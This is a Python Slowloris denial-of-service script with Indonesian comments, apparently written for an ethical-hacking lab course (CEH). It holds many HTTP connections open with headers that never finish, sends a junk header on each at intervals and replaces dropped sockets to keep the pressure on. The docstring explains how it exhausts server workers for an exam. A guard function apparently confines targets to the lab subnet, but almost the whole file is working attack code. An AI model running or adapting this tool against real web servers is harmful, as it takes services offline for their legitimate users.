#!/usr/bin/env python3
"""Slowloris. Menahan banyak koneksi tetap terbuka dengan header yang tidak
pernah selesai.

Pemakaian:
    python3 slowloris.py <target> [jumlah_soket] [jeda_detik]

Contoh:
    python3 /lab/serang/slowloris.py web 30 12

Cara kerjanya, dan ini yang ditanyakan di ujian: slowloris TIDAK mengirim
banyak data. Ia membuka koneksi, mengirim baris pertama permintaan HTTP, lalu
sengaja tidak pernah mengirim baris kosong yang menandakan header sudah
selesai. Server menyimpulkan klien masih mengetik, jadi ia menahan satu
pekerja untuk koneksi itu. Sepuluh koneksi seperti ini sudah cukup untuk
menghabiskan server yang MaxRequestWorkers-nya sepuluh, dengan lalu lintas
yang lebih kecil daripada memuat satu gambar.

Hentikan dengan Ctrl-C.
"""

import random
import socket
import string
import sys
import time

sys.path.insert(0, "/lab/serang")
from pagar import pastikan_target_lab  # noqa: E402


def acak(n):
    return "".join(random.choice(string.ascii_letters) for _ in range(n))


def buka_soket(ip, port, nama):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Batas tunggu pendek. Kalau server sudah penuh, connect() memang tidak
    # akan pernah dijawab, dan menunggu lama di situ cuma memperlambat lab.
    s.settimeout(2.5)
    s.connect((ip, port))
    awal = (
        "GET /?%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0 (lab CEH 07)\r\n"
        "Accept-Language: id-ID,id;q=0.9\r\n"
    ) % (acak(8), nama)
    s.send(awal.encode("ascii"))
    return s


def main():
    nama = sys.argv[1] if len(sys.argv) > 1 else "web"
    jumlah = int(sys.argv[2]) if len(sys.argv) > 2 else 30
    jeda = float(sys.argv[3]) if len(sys.argv) > 3 else 12.0
    port = 80

    ip, subnet = pastikan_target_lab(nama)
    print("target  : %s (%s) port %d" % (nama, ip, port))
    print("subnet  : %s, dalam jaringan lab, boleh diserang" % subnet)
    print("rencana : %d soket, kirim satu header sampah tiap %.0f detik"
          % (jumlah, jeda))
    print("berhenti: Ctrl-C\n")

    soket = []
    for _ in range(jumlah):
        try:
            soket.append(buka_soket(ip, port, nama))
        except OSError as e:
            print("  soket gagal dibuka: %s" % e)
    print("terbuka : %d dari %d soket\n" % (len(soket), jumlah))

    putaran = 0
    try:
        while True:
            putaran += 1
            hidup = []
            for s in soket:
                try:
                    s.send(("X-%s: %s\r\n" % (acak(6), acak(6))).encode("ascii"))
                    hidup.append(s)
                except OSError:
                    try:
                        s.close()
                    except OSError:
                        pass
            diputus = len(soket) - len(hidup)
            soket = hidup

            # Koneksi yang hilang diganti, supaya tekanannya tetap.
            for _ in range(jumlah - len(soket)):
                try:
                    soket.append(buka_soket(ip, port, nama))
                except OSError:
                    break

            print("putaran %-3d soket tertahan: %2d dari %2d   diputus server"
                  " ronde ini: %2d" % (putaran, len(soket), jumlah, diputus))
            time.sleep(jeda)
    except KeyboardInterrupt:
        print("\nberhenti, menutup %d soket." % len(soket))
        for s in soket:
            try:
                s.close()
            except OSError:
                pass


if __name__ == "__main__":
    main()
